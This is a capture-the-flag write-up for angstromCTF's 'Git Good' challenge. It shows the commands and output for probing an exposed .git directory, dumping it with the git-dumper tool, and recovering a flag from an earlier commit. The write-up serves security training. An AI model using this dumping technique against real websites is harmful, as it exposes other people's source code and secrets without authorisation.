### Challenge

```
Did you know that angstrom has a git repo for all the challenges? I noticed that clam committed a very work in progress challenge so I thought it was worth sharing.
```

### Recon

```
kali@kali:~$ curl https://gitgood.2020.chall.actf.co/.git/HEAD
ref: refs/heads/master
kali@kali:~$ curl https://gitgood.2020.chall.actf.co/.gitignore
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>Cannot GET /.gitignore</pre>
</body>                                                                                                                                                                                                                                   
</html>                                                                                                                                                                                                                                   
kali@kali:~$ 
```

### Solve

* Use git dumper to fetch all the resource from the web server
```
kali@kali:~$ git clone https://github.com/arthaud/git-dumper
Cloning into 'git-dumper'...
remote: Enumerating objects: 3, done.
remote: Counting objects: 100% (3/3), done.
remote: Compressing objects: 100% (3/3), done.
remote: Total 60 (delta 0), reused 1 (delta 0), pack-reused 57
Unpacking objects: 100% (60/60), done.
kali@kali:~$ cd git-dumper/
(env) kali@kali:~/git-dumper$ pip3 install -r requirements.txt 
(env) kali@kali:~/git-dumper$ python3 git-dumper.py https://gitgood.2020.chall.actf.co/.git gitGood
[-] Testing https://gitgood.2020.chall.actf.co/.git/HEAD [200]
[-] Testing https://gitgood.2020.chall.actf.co/.git/ [404]
[-] Fetching common files
[-] Fetching https://gitgood.2020.chall.actf.co/.gitignore [404]
[-] Fetching https://gitgood.2020.chall.actf.co/.git/COMMIT_EDITMSG [200]
[-] Fetching https://gitgood.2020.chall.actf.co/.git/description [200]
[-] Fetching https://gitgood.2020.chall.actf.co/.git/hooks/commit-msg.sample [200]
[-] Fetching https://gitgood.2020.chall.actf.co/.git/hooks/applypatch-msg.sample [200]
[-] Fetching https://gitgood.2020.chall.actf.co/.git/hooks/post-receive.sample [404]
[-] Fetching https://gitgood.2020.chall.actf.co/.git/hooks/pre-applypatch.sample [200]
[-] Fetching https://gitgood.2020.chall.actf.co/.git/hooks/post-commit.sample [404]
[-] Fetching https://gitgood.2020.chall.actf.co/.git/hooks/pre-commit.sample [200]
[-] Fetching https://gitgood.2020.chall.actf.co/.git/hooks/post-update.sample [200]
[-] Fetching https://gitgood.2020.chall.actf.co/.git/hooks/pre-rebase.sample [200]
[-] Fetching https://gitgood.2020.chall.actf.co/.git/hooks/pre-receive.sample [200]
[-] Fetching https://gitgood.2020.chall.actf.co/.git/hooks/prepare-commit-msg.sample [200]
[-] Fetching https://gitgood.2020.chall.actf.co/.git/info/exclude [200]
[-] Fetching https://gitgood.2020.chall.actf.co/.git/hooks/update.sample [200]
[-] Fetching https://gitgood.2020.chall.actf.co/.git/objects/info/packs [200]
[-] Fetching https://gitgood.2020.chall.actf.co/.git/hooks/pre-push.sample [200]
[-] Fetching https://gitgood.2020.chall.actf.co/.git/index [200]
[-] Finding refs/
[-] Fetching https://gitgood.2020.chall.actf.co/.git/logs/refs/remotes/origin/master [404]
[-] Fetching https://gitgood.2020.chall.actf.co/.git/config [200]
[-] Fetching https://gitgood.2020.chall.actf.co/.git/HEAD [200]
[-] Fetching https://gitgood.2020.chall.actf.co/.git/logs/refs/heads/master [200]
[-] Fetching https://gitgood.2020.chall.actf.co/.git/FETCH_HEAD [404]
[-] Fetching https://gitgood.2020.chall.actf.co/.git/logs/refs/stash [404]
[-] Fetching https://gitgood.2020.chall.actf.co/.git/logs/HEAD [200]
[-] Fetching https://gitgood.2020.chall.actf.co/.git/ORIG_HEAD [404]
[-] Fetching https://gitgood.2020.chall.actf.co/.git/logs/refs/remotes/origin/HEAD [404]
[-] Fetching https://gitgood.2020.chall.actf.co/.git/refs/remotes/origin/master [404]
[-] Fetching https://gitgood.2020.chall.actf.co/.git/refs/remotes/origin/HEAD [404]
[-] Fetching https://gitgood.2020.chall.actf.co/.git/packed-refs [404]
[-] Fetching https://gitgood.2020.chall.actf.co/.git/refs/heads/master [200]
[-] Fetching https://gitgood.2020.chall.actf.co/.git/refs/stash [404]
[-] Fetching https://gitgood.2020.chall.actf.co/.git/info/refs [200]
[-] Finding packs
[-] Finding objects
[-] Fetching objects
[-] Fetching https://gitgood.2020.chall.actf.co/.git/objects/8f/08af35205d0ba80e94b4f4306311039d62e138 [200]
[-] Fetching https://gitgood.2020.chall.actf.co/.git/objects/00/00000000000000000000000000000000000000 [404]
[-] Fetching https://gitgood.2020.chall.actf.co/.git/objects/e9/75d678f209da09fff763cd297a6ed8dd77bb35 [200]
[-] Fetching https://gitgood.2020.chall.actf.co/.git/objects/6b/3c94c0b90a897f246f0f32dec3f5fd3e40abb5 [200]
[-] Fetching https://gitgood.2020.chall.actf.co/.git/objects/63/8887a54973265c428cd51ce6dfd48f196d91c4 [200]
[-] Fetching https://gitgood.2020.chall.actf.co/.git/objects/78/9fa5caf452f5f6f25bfa9b1c0ab1d593dce1b3 [200]
[-] Fetching https://gitgood.2020.chall.actf.co/.git/objects/24/7c9d491c0d2d6da5e93afcd0681b3edd7ccd70 [200]
[-] Fetching https://gitgood.2020.chall.actf.co/.git/objects/c2/658d7d1b31848c3b71960543cb0368e56cd4c7 [200]
[-] Fetching https://gitgood.2020.chall.actf.co/.git/objects/49/b319c37dc674bca682cab0f2506473dda6bd9a [200]
[-] Fetching https://gitgood.2020.chall.actf.co/.git/objects/b6/30430d9d393a6b143af2839fd24ac2118dba79 [200]
[-] Fetching https://gitgood.2020.chall.actf.co/.git/objects/0f/52598006f9cdb21db2f4c8d44d70535630289b [200]
[-] Fetching https://gitgood.2020.chall.actf.co/.git/objects/94/02d143d3d7998247c95597b63598ce941e7bcb [200]
[-] Running git checkout .
(env) kali@kali:~/git-dumper$ ls
```

* Solve to get flag

```
(env) kali@kali:~/git-dumper$ cd gitGood/
(env) kali@kali:~/git-dumper/gitGood$ ls
index.html  index.js  package.json  package-lock.json  thisistheflag.txt
(env) kali@kali:~/git-dumper/gitGood$ cat thisistheflag.txt 
There used to be a flag here...
(env) kali@kali:~/git-dumper/gitGood$ git log
commit e975d678f209da09fff763cd297a6ed8dd77bb35 (HEAD -> master)
Author: aplet123 <noneof@your.business>
Date:   Sat Mar 7 16:27:44 2020 +0000

    Initial commit

commit 6b3c94c0b90a897f246f0f32dec3f5fd3e40abb5
Author: aplet123 <noneof@your.business>
Date:   Sat Mar 7 16:27:24 2020 +0000

    haha I lied this is the actual initial commit
(env) kali@kali:~/git-dumper/gitGood$ git reset HEAD~1
Unstaged changes after reset:
M       thisistheflag.txt
(env) kali@kali:~/git-dumper/gitGood$ cat thisistheflag.txt 
There used to be a flag here...
(env) kali@kali:~/git-dumper/gitGood$ git stash
Saved working directory and index state WIP on master: 6b3c94c haha I lied this is the actual initial commit
(env) kali@kali:~/git-dumper/gitGood$ cat thisistheflag.txt 
actf{b3_car3ful_wh4t_y0u_s3rve_wi7h}

btw this isn't the actual git server
(env) kali@kali:~/git-dumper/gitGood$ 
```

